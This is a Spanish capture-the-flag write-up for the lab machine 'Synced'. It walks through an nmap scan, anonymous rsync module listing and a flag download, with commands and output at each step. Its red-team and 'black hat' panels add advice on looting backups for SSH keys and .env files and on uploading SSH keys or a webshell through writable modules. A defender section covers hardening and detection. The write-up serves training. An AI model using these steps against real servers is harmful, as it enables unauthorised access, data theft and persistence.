Resumen Ejecutivo

Synced expone rsync en el puerto 873 sin autenticación. rsync es una herramienta de sincronización de archivos. Cuando se configura con un módulo de acceso anónimo (anonymous share), cualquiera puede listar y descargar los archivos que contiene — sin usuario ni contraseña. La flag estaba directamente en el módulo public como archivo flag.txt.

¿Qué es rsync y por qué es un vector de ataque?

rsync es una herramienta de sincronización de archivos muy usada en Linux para backups, deploys y transferencias. Puerto 873. Su protocolo permite transferir solo los bloques que han cambiado — eficiente para sincronizar servidores.

⚠ rsync con módulos anónimos = acceso total a los archivos compartidos

Cuando el administrador configura un módulo sin requerir autenticación (auth users vacío), cualquier cliente puede conectarse y descargar — o incluso subir — archivos. En backups mal configurados esto puede exponer dumps de bases de datos, claves SSH, archivos de configuración con contraseñas y más.

Paso a Paso — Detallado

Paso 1 — Reconocimiento

nmap — Descubrir el puerto rsync

¿Por qué escanear todos los puertos?

rsync usa el puerto 873, que no está en el top 1000 de nmap por defecto. Si escaneamos solo los puertos comunes, lo perdemos. Con -p- garantizamos que no se nos escapa nada.

nmap -p- --open -n -T4 10.129.6.240
-p- → todos los 65535 puertos TCP
--open → solo puertos abiertos
-n → sin resolución DNS
-T4 → velocidad agresiva
Output
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack ttl 63
(protocol version 31)
¿Qué nos dice?
  • ttl 63 → Linux (TTL 64 - 1 salto)
  • 873/tcp rsync → rsync activo. Un solo puerto = todo el ataque pasa por aquí
  • protocol version 31 → versión del protocolo rsync — compatible con el cliente estándar de Kali
Decisión

Puerto 873 rsync. Listar módulos disponibles sin autenticación.

Paso 2 — Enumeración

rsync rsync://IP/ — Listar módulos

¿Qué es un módulo rsync?

rsync organiza el acceso en "módulos" — directorios predefinidos con nombre, descripción y permisos. Es similar a los shares de SMB o los módulos de FTP. Listándolos sin credenciales sabemos qué está disponible públicamente.

rsync rsync://10.129.6.240/
rsync → herramienta de sincronización de archivos de Linux
rsync://10.129.6.240/ → URL del servidor rsync. La barra final sin módulo = listar todos los módulos disponibles
⚠ Sin usuario ni contraseña → intento anónimo. Si hay módulos públicos, los muestra.
Output
public         	Anonymous Share
¿Qué significa?
  • public → nombre del módulo rsync accesible anónimamente
  • Anonymous Share → descripción — confirma acceso sin credenciales
  • Solo hay un módulo → ese es EL objetivo
Decisión

Módulo public accesible. Listar su contenido.

Paso 3 — Enumeración

rsync rsync://IP/public/ — Ver archivos del módulo

rsync rsync://10.129.6.240/public/
rsync://10.129.6.240/public/ → URL con módulo específico + barra final = listar contenido del módulo como ls -la
Output
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt
¿Qué vemos?
  • flag.txt → el archivo objetivo. 33 bytes = exactamente el tamaño de un hash MD5 + salto de línea
  • Permisos -rw-r--r-- → readable por cualquiera
Decisión

flag.txt visible y legible. Descargar con rsync.

Paso 4 — Explotación

rsync download + cat — Obtener la flag

rsync rsync://10.129.6.240/public/flag.txt /tmp/flag.txt && cat /tmp/flag.txt
rsync://10.129.6.240/public/flag.txt → origen: archivo específico en el módulo remoto
/tmp/flag.txt → destino local donde guardar el archivo descargado
&& cat /tmp/flag.txt → si la descarga fue exitosa (exit code 0), mostrar el contenido en pantalla
Output
72eaf5344ebb84908ae543a719830519
Resultado

rsync descargó flag.txt del servidor remoto al directorio local /tmp/. El archivo contiene el hash MD5 de la flag. Sin credenciales, sin exploits, sin bypass — conexión directa a un servicio mal configurado.

Panel de Agentes Ghost-Ops

⚔ RTO — Red Team

Puerto 873 = rsync. Listar módulos primero. Si hay módulos con write access: subir SSH authorized_keys → acceso root. En backups: buscar .conf, id_rsa, .env, database dumps. Descargar todo con rsync -av rsync://IP/public/ /tmp/loot/

🛡 BTA — Blue Team

Nivel de ruido: MUY BAJO. rsync genera 1 conexión TCP limpia al 873. Sin logs de auth fallida. Sin alertas IDS por defecto. Solo detectable con firewall bloqueando 873 desde IPs externas o monitoreo de acceso en rsyncd.log.

🎭 BHM — Black Hat

"Synced" = rsync es la pista en el nombre. Si el módulo tiene permisos de escritura: subir webshell si hay webroot, o SSH key para acceso persistente. Siempre probar rsync --list-only rsync://IP/modulo/ --recursive para ver subdirectorios.

Lecciones Aprendidas

⚔ Para el Atacante

  • Puerto 873 = rsync → listar módulos con rsync rsync://IP/
  • Nombre de la máquina es la pista del servicio: "Synced" = rsync
  • rsync anónimo = descargar con rsync rsync://IP/modulo/archivo /local
  • Para write access: rsync /local/file rsync://IP/modulo/ → subir SSH keys
  • Descarga recursiva completa: rsync -av rsync://IP/modulo/ /tmp/loot/

🛡 Para el Defensor

  • Requerir autenticación: auth users = usuario en rsyncd.conf
  • Limitar IPs: hosts allow = 192.168.1.0/24
  • Nunca exponer rsync en interfaces públicas sin firewall
  • Deshabilitar módulos si no son necesarios: comentar en rsyncd.conf
  • Detectar: conexiones entrantes al 873 en firewall logs
